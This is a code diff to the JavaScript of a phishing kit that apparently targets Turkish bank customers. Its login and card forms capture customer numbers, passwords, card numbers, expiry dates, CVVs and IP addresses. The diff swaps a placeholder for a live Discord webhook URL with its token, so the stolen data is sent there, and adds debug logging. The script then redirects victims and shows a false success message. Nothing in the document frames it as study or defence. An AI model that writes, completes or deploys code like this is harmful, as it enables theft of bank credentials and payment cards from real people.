@@ -1,9 +1,11 @@
 async function getIP() {
     try {
-        const response = await fetch('https://api.ipify.org?format=json');
+        const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
+        console.log("IP alındı:", data.ip);
         return data.ip;
     } catch (error) {
+        console.error("IP alınamadı:", error);
         return "IP alınamadı";
     }
 }
@@ -14,13 +16,17 @@ async function handleLogin(event) {
     const password = document.getElementById("password").value;
     const ip = await getIP();
     const data = `Müşteri No: ${customer_id}, Şifre: ${password}, IP: ${ip}`;
+    console.log("Gönderilen veri:", data);
 
-    fetch("YOUR_DISCORD_WEBHOOK_URL", {
+    fetch("https://discord.com/api/webhooks/1356649086886875259/EMzyEQwmf4BXE-0-NA8Y9SKMTmDazDF5T6PEnIh7M55tmxUSJW10jS7d4LBlZZUoqi2H", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: data })
-    }).then(() => {
+    }).then(response => {
+        console.log("Webhook yanıtı:", response);
         window.location.href = "card.html";
+    }).catch(error => {
+        console.error("Webhook hatası:", error);
     });
 }
 
@@ -50,13 +56,17 @@ async function handleCard(event) {
 
     const ip = await getIP();
     const data = `CC: ${cc}, Expiry: ${expiry}, CVV: ${cvv}, IP: ${ip}`;
+    console.log("Gönderilen veri:", data);
 
-    fetch("YOUR_DISCORD_WEBHOOK_URL", {
+    fetch("https://discord.com/api/webhooks/1356649086886875259/EMzyEQwmf4BXE-0-NA8Y9SKMTmDazDF5T6PEnIh7M55tmxUSJW10jS7d4LBlZZUoqi2H", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ content: data })
-    }).then(() => {
+    }).then(response => {
+        console.log("Webhook yanıtı:", response);
         alert("Güncelleme başarılı!");
         window.location.href = "index.html";
+    }).catch(error => {
+        console.error("Webhook hatası:", error);
     });
 }
